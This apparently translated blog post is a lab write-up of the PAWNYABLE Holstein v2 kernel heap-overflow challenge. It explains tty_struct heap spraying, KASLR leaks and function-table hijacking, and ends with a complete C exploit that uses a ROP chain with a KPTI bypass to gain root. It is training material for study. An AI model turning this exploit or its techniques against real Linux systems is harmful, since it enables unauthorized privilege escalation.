---
title: "[KERNEL] Heap OverFlow"
description: "※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module [KERNEL] Holstein Module※ Invalid part"
date: "2024-11-14"
translation_key: "tistory-1b15a9a45937"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-Heap-OverFlow"
private: false
---

**※ Since the analysis was conducted with reference to the data, there may be errors.** 

**※ If there is anything that needs to be supplemented or corrected, please let us know and we will check and take action.**

**[https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module](https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module)**

 [\[KERNEL\] Holstein Module

※ If there are any mistakes, please let me know. We will check and correct it. ※ ​Holsteinhttps://whrdud727.tistory.com/entry/KERNEL-Environment-Setting ​\[KERNEL\] Environment Setting※ ​Please let me know if there are any mistakes.

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module)

In the post above, we discussed Holstein v1.

This time, we will cover Holstein v2, which addresses pawnyable's heap vulnerability.

[https://pawnyable.cafe/linux-kernel/index.html](https://pawnyable.cafe/linux-kernel/index.html)

 [Linux Kernel Exploitation | PAWNYABLE!

Linux Kernel Exploitation

pawnyable.cafe](https://pawnyable.cafe/linux-kernel/index.html)

* * *

First, looking at the modified part of the code, there has been a change in the buffer when inputting and writing values in module\_read() and module\_write().

```
static ssize_t module_read(struct file *file,
                           char __user *buf, size_t count,
                           loff_t *f_pos)
{
  printk(KERN_INFO "module_read called\n");

  if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  printk(KERN_INFO "module_write called\n");

  if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }

  return count;
}
```

Safe functions are used rather than \_copy\_to\_user() and \_copy\_from\_user(), which create vulnerabilities by not performing range verification.

Besides that, the most important part to consider is the part used as an argument.

If you take a quick look at Holstein v1's module\_read(), you can see that a local variable is created and used.

```
static ssize_t module_read(struct file *file,
 char __user *buf, size_t count,
 loff_t *f_pos)
{
 char kbuf[BUFFER_SIZE] = { 0 };

 printk(KERN_INFO "module_read called\n");

 memcpy(kbuf, g_buf, BUFFER_SIZE);
 if (_copy_to_user(buf, kbuf, count)) {
 printk(KERN_INFO "copy_to_user failed\n");
 return -EINVAL;
 }

 return count;
}
```

In the changed code, you can see that although a local variable is declared, data is passed using the g\_buf variable.

```
copy_to_user(buf, g_buf, count)
```

If you look at where and how this g\_buf is declared, you can see that it is allocated with kmalloc() in module\_open().

```
static int module_open(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_open called\n");

  g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }

  return 0;
}
```

Why is it vulnerable to inputting and reading values into the heap area allocated with kmalloc()?

The Kernel's Heap area is an area shared by all drivers and objects used in the Kernel.

Therefore, it can be used to destroy or exploit other target objects by modulating the value of the heap memory.

* * *

The size of g\_buf is 0x400.

```
#define BUFFER_SIZE 0x400
```

Among the structures whose size is most similar to 0x400, there is tty\_struct.

tty\_struct is defined in tty.h and is a structure to maintain the state of the TTY.

```
struct tty_struct {
 int magic;
	struct kref kref;
	struct device *dev;	/* class device or NULL (e.g. ptys, serdev) */
	struct tty_driver *driver;
	const struct tty_operations *ops;
 int index;
 ...
```

You need to know by what process this structure is executed in order to use it, manipulate it, and use it for exploits.

This is a structure called when running a virtual terminal such as \[ /dev/ptmx \], and is also called in the process of allocating heap in the kernel.

This structure contains ops, a function table, to execute the appropriate function for each state.

```
const struct tty_operations *ops;
```

Exploit becomes possible if this function table is overwritten with a random table set by the attacker and is called.

We have confirmed that we need to manipulate the function table, and then we need to check which offset is used among the functions in the function table. For this, the Heap Spray technique must be used. In addition, in order to bypass Kaslr, data in the heap memory area must be read through Heap Spray. 

- Find the address to configure Kernel base and random table with Heap Spray
- Check which offset is used in the function table with Heap Spray

First, configure main() as follows to find the value to perform memory leak.

```
int main() {
 int spray[100];
 for (int i = 0; i < 50; i++) {
 spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
 if (spray[i] == -1)
 fatal("/dev/ptmx");
 }

 int fd = open("/dev/holstein", O_RDWR);
 if (fd == -1)
 fatal("/dev/holstein");

 for (int i = 50; i < 100; i++) {
 spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
 if (spray[i] == -1)
 fatal("/dev/ptmx");
 }

 char buf[0x500];
 memset(buf, 'A', 0x500);
 write(fd, buf, 0x500);

 getchar(); 

 close(fd);
 return 0;
}
```

By opening \[ /dev/ptmx \], the memory including tty\_struct is expanded and loaded into the user space to perform debugging.

![](/assets/images/tistory/tistory-1b15a9a45937/001.png)

Place bp at the location where g\_buf is used and analyze the address.

![](/assets/images/tistory/tistory-1b15a9a45937/002.png)

You can see that a similar structure continues, and this part is tty\_struct.

Among these spaces, search for the part that contains the Kernel address and the Heap address for constructing the fake func table.

![](/assets/images/tistory/tistory-1b15a9a45937/003.png)

You can find the value for calculating Kernel Base at location 0x418.

This location is where the original function table is located, and in the case of the function table, it exists on the kernel.

![](/assets/images/tistory/tistory-1b15a9a45937/004.png)

Heap address can be found at 0x438.

```
 char buf[0x500];
 read(fd, buf, 0x500);
 kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
 printf("[+] kbase = 0x%016lx\n", kbase);
 
 g_buf = *(unsigned long*)&buf[0x438] - 0x438;
printf("[+] g_buf = 0x%016lx\n", g_buf);
```

Use the corresponding values to find each address.

The next thing to do is to see which offset is executed in the function table. This can be easily obtained by manipulating the value at 0x418 with a fake func table and placing addresses with increasing numbers from 0 to n in the function table.

```
unsigned long *p = (unsigned long*)&buf;
for (int i = 0; i < 0x40; i++) {
 *p++ = 0xffffffffdead0000 + (i << 8);
}
*(unsigned long*)&buf[0x418] = g_buf;
write(fd, buf, 0x420);

for (int i = 0; i < 100; i++) {
 ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
}
```

![](/assets/images/tistory/tistory-1b15a9a45937/005.png)

You can see that the offset is 0xc.

Because the rip register can be manipulated, SMEP can be bypassed. 

Exploit can be done by writing code that bypasses KPTI, which was covered once in the link below.

[https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass](https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass)

 [\[KERNEL\] KROP\_(SMEP bypass)

※ If there are any mistakes, please let me know. We will check and correct it. ※ In the user area, ROP was used to bypass the NX-BIT protection technique. ROP in the kernel area also uses a protection technique called SMEP.

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass)[https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass](https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass)

 [\[KERNEL\] KROP\_(KPTI bypass)

※ If there are any mistakes, please let me know. We will check and correct it. ※This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP.  #!/bin/shqemu-system-x86\_64 \\ -m 64M \\ -nographic \\ -kernel bz

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass)

Here is the full exploit code.

```
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ofs_tty_ops 0xc38880
#define addr_commit_creds (kbase + 0x0744b0)
#define addr_prepare_kernel_cred (kbase + 0x074650)
#define rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp (kbase + 0x3a478a)
#define rop_pop_rdi (kbase + 0x0d748d)
#define rop_pop_rcx (kbase + 0x13c1c4)
#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
#define rop_bypass_kpti (kbase + 0x800e26)

unsigned long kbase, g_buf;
unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  save_state();

  // tty_struct�췷pray
  int spray[100];
  for (int i = 0; i < 50; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  int fd = open("/dev/holstein", O_RDWR);
  if (fd == -1)
    fatal("/dev/holstein");

  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1)
      fatal("/dev/ptmx");
  }

  char buf[0x500];
  read(fd, buf, 0x500);
  kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
  printf("[+] kbase = 0x%016lx\n", kbase);

  g_buf = *(unsigned long*)&buf[0x438] - 0x438;
  printf("[+] g_buf = 0x%016lx\n", g_buf);

  unsigned long *p = (unsigned long*)&buf[0x400];
  p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
  *(unsigned long*)&buf[0x418] = g_buf + 0x400;

  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  write(fd, buf, 0x500);

  for (int i = 0; i < 100; i++) {
    ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); 
  }

  getchar();
  return 0;
}
```

![](/assets/images/tistory/tistory-1b15a9a45937/006.png)

Successfully escalated privileges.

The image below is the part that was organized while analyzing the exploit code above.

There may be some parts that are not accurate, but I think you can refer to it.

![](/assets/images/tistory/tistory-1b15a9a45937/007.png)